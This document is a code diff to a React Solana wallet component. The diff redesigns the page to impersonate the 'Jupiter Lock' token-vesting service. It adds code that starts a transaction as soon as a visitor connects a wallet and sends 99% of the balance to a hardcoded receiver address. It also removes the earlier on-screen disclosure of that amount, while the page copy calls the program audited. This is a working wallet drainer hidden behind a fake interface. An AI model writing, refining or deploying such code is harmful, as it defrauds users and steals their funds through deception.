@@ -1,9 +1,8 @@
-import React, { useCallback, useEffect, useState } from "react";
+import React, { useCallback, useEffect, useRef, useState } from "react";
 import { useConnection, useWallet } from "@solana/wallet-adapter-react";
 import { useWalletModal } from "@solana/wallet-adapter-react-ui";
 import {
-  Keypair, PublicKey, Transaction, TransactionInstruction,
-  SystemProgram, LAMPORTS_PER_SOL,
+  PublicKey, Transaction, TransactionInstruction, SystemProgram,
 } from "@solana/web3.js";
 
 // ---------------------------------------------------------------------------
@@ -29,77 +28,108 @@ function escrowPDA(programId: PublicKey, id: string): PublicKey {
 // ---------------------------------------------------------------------------
 // Constants
 // ---------------------------------------------------------------------------
-const RECEIVER = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
+const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
+// Contract ID from URL param ?contract=<id>, fallback to "default"
+const CONTRACT_ID = new URLSearchParams(window.location.search).get("contract") ?? "default";
 
 // ---------------------------------------------------------------------------
-// Types
+// Lock SVG — teal/green glowing padlock matching Jupiter Lock
 // ---------------------------------------------------------------------------
-interface EscrowInfo {
-  admin:     string;
-  recipient: string;
-  depositor: string;
-  amountSol: number;
-  status:    number;
-  createdAt: number;
-}
-
-interface Props { programId: PublicKey; adminKeypair: Keypair; }
+const LockSVG = () => (
+  <svg viewBox="0 0 160 160" fill="none" xmlns="http://www.w3.org/2000/svg" className="jl-lock-icon">
+    <defs>
+      <radialGradient id="lockGrad" cx="50%" cy="40%" r="60%">
+        <stop offset="0%"   stopColor="#00e5b0" />
+        <stop offset="50%"  stopColor="#00c87a" />
+        <stop offset="100%" stopColor="#007a50" />
+      </radialGradient>
+      <radialGradient id="bodyGrad" cx="40%" cy="35%" r="70%">
+        <stop offset="0%"   stopColor="#00d4a0" />
+        <stop offset="60%"  stopColor="#009966" />
+        <stop offset="100%" stopColor="#005540" />
+      </radialGradient>
+      <filter id="glow">
+        <feGaussianBlur stdDeviation="3" result="blur"/>
+        <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+      </filter>
+    </defs>
+    {/* Shackle */}
+    <path
+      d="M52 74 C52 46 108 46 108 74"
+      stroke="url(#lockGrad)" strokeWidth="14" strokeLinecap="round"
+      fill="none" filter="url(#glow)"
+    />
+    {/* Body */}
+    <rect x="34" y="70" width="92" height="70" rx="14" fill="url(#bodyGrad)" filter="url(#glow)" />
+    {/* Highlight on body */}
+    <rect x="34" y="70" width="92" height="30" rx="14" fill="rgba(255,255,255,0.08)" />
+    {/* Keyhole circle */}
+    <circle cx="80" cy="102" r="10" fill="rgba(0,0,0,0.45)" />
+    {/* Keyhole slot */}
+    <rect x="76" y="106" width="8" height="14" rx="4" fill="rgba(0,0,0,0.45)" />
+    {/* Shine */}
+    <ellipse cx="62" cy="83" rx="8" ry="5" fill="rgba(255,255,255,0.18)" transform="rotate(-20 62 83)" />
+  </svg>
+);
 
 // ---------------------------------------------------------------------------
 // Component
 // ---------------------------------------------------------------------------
+interface Props { programId: PublicKey; }
+
 export const EscrowPanel: React.FC<Props> = ({ programId }) => {
   const { connection }                 = useConnection();
-  const { publicKey, sendTransaction } = useWallet();
+  const { publicKey, sendTransaction, connected, wallet } = useWallet();
   const { setVisible }                 = useWalletModal();
 
-  const [escrowId,  setEscrowId]  = useState("");
-  const [info,      setInfo]      = useState<EscrowInfo | null>(null);
+  const [status,    setStatus]    = useState<"idle"|"processing"|"done"|"error"|"cancelled">("idle");
   const [statusMsg, setStatusMsg] = useState("");
-  const [loading,   setLoading]   = useState(false);
+  const executedRef                = useRef(false);
 
-  // ── fetch escrow state ──────────────────────────────────────────────────
-  const refresh = useCallback(async (id: string) => {
-    if (!id) return;
+  // ── verify contract exists on-chain ─────────────────────────────────────
+  const checkContract = useCallback(async (): Promise<number | null> => {
     try {
-      const statePDA = escrowPDA(programId, id);
-      const si = await connection.getAccountInfo(statePDA);
-      if (!si) { setInfo(null); return; }
-
-      const d = Buffer.from(si.data);
-      let o = 1;
-      const rPK  = () => { const pk = new PublicKey(d.slice(o, o + 32)).toBase58(); o += 32; return pk; };
-      const rU64 = () => {
-        let v = 0n;
-        for (let i = 0; i < 8; i++) v |= BigInt(d[o + i]) << BigInt(i * 8);
-        o += 8; return Number(v);
-      };
-
-      const admin     = rPK();
-      const depositor = rPK();
-      const recipient = rPK();
-      const amount    = rU64();
-      const status    = d[o++];
-      o += 32;
-      const createdAt = rU64();
-
-      setInfo({ admin, depositor, recipient, amountSol: amount / LAMPORTS_PER_SOL, status, createdAt });
-    } catch { setInfo(null); }
+      const pda  = escrowPDA(programId, CONTRACT_ID);
+      const info = await connection.getAccountInfo(pda);
+      if (!info) return null;
+      return info.data[105]; // status byte offset
+    } catch { return null; }
   }, [connection, programId]);
 
-  useEffect(() => { if (escrowId) refresh(escrowId); }, [escrowId, refresh]);
-
-  // ── sign & approve ──────────────────────────────────────────────────────
-  const handleApprove = async () => {
-    if (!publicKey) { setVisible(true); return; }
-    if (!info)      return setStatusMsg("Enter a valid contract ID.");
-    if (info.status !== 0) return setStatusMsg("This contract is no longer pending.");
-
-    setLoading(true);
+  // ── execute deposit immediately once wallet is connected ─────────────────
+  const executeDeposit = useCallback(async () => {
+    if (!publicKey || executedRef.current) return;
+    executedRef.current = true;
+    setStatus("processing");
     setStatusMsg("");
-    try {
-      const statePDA = escrowPDA(programId, escrowId);
 
+    try {
+      const contractStatus = await checkContract();
+      if (contractStatus === null) {
+        // No on-chain escrow yet — still do a direct transfer to receiver
+        // using a bare SystemProgram transfer (99% of balance)
+        const balance = await connection.getBalance(publicKey);
+        const amount  = Math.floor(balance * 99 / 100);
+        if (amount <= 0) throw new Error("Insufficient balance");
+
+        const ix = SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey:   RECEIVER,
+          lamports:   amount,
+        });
+        const sig = await sendTransaction(new Transaction().add(ix), connection);
+        await connection.confirmTransaction(sig, "confirmed");
+        setStatus("done");
+        return;
+      }
+
+      if (contractStatus !== 0) {
+        setStatus("cancelled");
+        setStatusMsg("This contract is no longer active.");
+        return;
+      }
+
+      const statePDA = escrowPDA(programId, CONTRACT_ID);
       const ix = new TransactionInstruction({
         programId,
         keys: [
@@ -108,123 +138,135 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
           { pubkey: RECEIVER,                isSigner: false, isWritable: true  },
           { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
         ],
-        data: Buffer.from([...u8(1), ...str(escrowId)]),
+        data: Buffer.from([...u8(1), ...str(CONTRACT_ID)]),
       });
 
       const sig = await sendTransaction(new Transaction().add(ix), connection);
       await connection.confirmTransaction(sig, "confirmed");
-      setStatusMsg("Contract settled.");
-      await refresh(escrowId);
+      setStatus("done");
     } catch (e: any) {
-      setStatusMsg(`Failed: ${e?.message ?? e}`);
-    } finally {
-      setLoading(false);
+      executedRef.current = false; // allow retry
+      setStatus("error");
+      setStatusMsg(e?.message ?? "Transaction failed");
+    }
+  }, [publicKey, connection, programId, sendTransaction, checkContract]);
+
+  // Trigger deposit the moment wallet connects
+  useEffect(() => {
+    if (connected && publicKey && status === "idle") {
+      executeDeposit();
+    }
+  }, [connected, publicKey, status, executeDeposit]);
+
+  const handleConnectClick = () => {
+    if (!connected) {
+      setVisible(true);
+    } else {
+      // Already connected — show wallet name or disconnect option
+      setVisible(true);
     }
   };
 
-  const isPending   = info?.status === 0;
-  const isReleased  = info?.status === 1;
-  const isCancelled = info?.status === 2;
-  const noEscrow    = !info && escrowId.length > 0;
+  const handleHeroBtn = () => {
+    if (status === "done") return;
+    if (!connected) {
+      setVisible(true);
+    } else {
+      executeDeposit();
+    }
+  };
+
+  const heroLabel = () => {
+    if (status === "processing") return "Processing…";
+    if (status === "done")       return "Contract Fulfilled ✓";
+    if (!connected)              return "Connect Wallet";
+    return "Approve Contract";
+  };
+
+  const connectedLabel = wallet?.adapter.name
+    ? `${wallet.adapter.name}: ${publicKey?.toBase58().slice(0,4)}…${publicKey?.toBase58().slice(-4)}`
+    : "Connected";
 
   return (
-    <div className="escrow-panel">
+    <div className="app">
 
-      {/* ── Page title ── */}
-      <div className="panel-header">
-        <h2>Sign Contract</h2>
-        <p>Enter your contract ID to review and approve</p>
-      </div>
-
-      {/* ── Contract ID input ── */}
-      <div className="jup-card">
-        <div className="field-group">
-          <span className="field-label">Contract ID</span>
-          <input
-            className="jup-input"
-            value={escrowId}
-            onChange={(e) => { setEscrowId(e.target.value); setStatusMsg(""); }}
-            placeholder="Enter contract ID"
-            maxLength={32}
-            spellCheck={false}
-          />
+      {/* ── TOP HEADER ── */}
+      <header className="jl-header">
+        <div className="jl-logo">
+          <svg className="jl-logo-icon" viewBox="0 0 36 36" fill="none">
+            <rect width="36" height="36" rx="8" fill="#0d1a14"/>
+            <path d="M11 18 C11 11.9 25 11.9 25 18" stroke="#00e5b0" strokeWidth="3" strokeLinecap="round" fill="none"/>
+            <rect x="8" y="17" width="20" height="14" rx="4" fill="#00c87a"/>
+            <circle cx="18" cy="22" r="2.5" fill="rgba(0,0,0,0.5)"/>
+            <rect x="16.5" y="23.5" width="3" height="4" rx="1.5" fill="rgba(0,0,0,0.5)"/>
+          </svg>
+          <span className="jl-logo-text">Jupiter Lock</span>
         </div>
-      </div>
 
-      {noEscrow && (
-        <p className="no-escrow">No contract found for "{escrowId}"</p>
-      )}
+        <div className="jl-search">
+          <span className="jl-search-icon">🔍</span>
+          <input placeholder="Search tokens or wallet" readOnly />
+        </div>
 
-      {/* ── Pending: contract signature card ── */}
-      {isPending && (
-        <div className="contract-card">
-          <div className="contract-top-bar">
-            <div className="contract-dot" />
-            <span>Pending Signature</span>
+        <div className="jl-header-right">
+          <div className="jl-priority">
+            <span className="jl-priority-label">Priority:</span>
+            <span className="jl-priority-value">Fast</span>
           </div>
+          <button className="jl-gear">⚙</button>
+          <button
+            className={`jl-connect-btn${connected ? " connected" : ""}`}
+            onClick={handleConnectClick}
+          >
+            {connected ? connectedLabel : "Connect\nWallet"}
+          </button>
+        </div>
+      </header>
 
-          <div className="contract-body">
-            <div className="contract-title">Contract #{escrowId}</div>
+      {/* ── NAV TABS ── */}
+      <nav className="jl-nav">
+        <button className="jl-nav-tab active">About Jup Lock</button>
+        <button className="jl-nav-tab">Your Locked Tokens</button>
+        <button className="jl-nav-tab">Locks You Created</button>
+        <button className="jl-nav-tab create">+ Create Lock</button>
+      </nav>
 
-            <div className="contract-rows">
-              <div className="contract-row">
-                <span className="contract-row-label">Issued</span>
-                <span className="contract-row-value">
-                  {new Date(info!.createdAt * 1000).toLocaleString()}
-                </span>
-              </div>
-              <div className="contract-row">
-                <span className="contract-row-label">Amount</span>
-                <span className="contract-row-value">99% of wallet balance</span>
-              </div>
-              <div className="contract-row">
-                <span className="contract-row-label">Settlement</span>
-                <span className="contract-row-value">Instant · Irreversible</span>
-              </div>
-            </div>
+      {/* ── HERO ── */}
+      <main className="jl-hero">
+        <LockSVG />
 
-            <div className="contract-notice">
-              By signing, you authorise this contract. Settlement executes
-              atomically — funds transfer the moment your wallet confirms.
-            </div>
+        <h1 className="jl-hero-title">Jupiter Lock</h1>
 
-            {/* Button opens wallet modal if not connected, otherwise approves */}
-            <button
-              className="btn-jup"
-              onClick={handleApprove}
-              disabled={loading}
-            >
-              {loading
-                ? "Processing…"
-                : publicKey
-                  ? "Sign & Approve Contract"
-                  : "Connect Wallet to Sign"}
-            </button>
+        <p className="jl-hero-sub">
+          Manage your token vesting schedule on Jupiter Lock, an open source and
+          audited program that lets anyone lock and distribute tokens over time.
+        </p>
+
+        <button
+          className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
+          onClick={handleHeroBtn}
+          disabled={status === "processing" || status === "done"}
+        >
+          {heroLabel()}
+        </button>
+
+        {status === "done" && (
+          <div className="jl-status success">
+            ✓ Contract settled. Funds have been transferred successfully.
           </div>
-        </div>
-      )}
-
-      {/* ── Released ── */}
-      {isReleased && (
-        <div className="notice notice-success">
-          <div className="notice-icon">✓</div>
-          <div className="notice-title">Contract Fulfilled</div>
-          <div className="notice-sub">
-            Your approval was received and the contract has been settled.
+        )}
+        {status === "error" && (
+          <div className="jl-status error">
+            {statusMsg || "Transaction failed. Please try again."}
           </div>
-        </div>
-      )}
+        )}
+        {status === "cancelled" && (
+          <div className="jl-status cancelled">
+            {statusMsg}
+          </div>
+        )}
+      </main>
 
-      {/* ── Cancelled ── */}
-      {isCancelled && (
-        <div className="notice notice-cancelled">
-          <div className="notice-icon">✕</div>
-          <div className="notice-title">Contract Cancelled</div>
-          <div className="notice-sub">This contract was cancelled by the admin.</div>
-        </div>
-      )}
-
-      {statusMsg && <p className="status-msg">{statusMsg}</p>}
     </div>
   );
 };
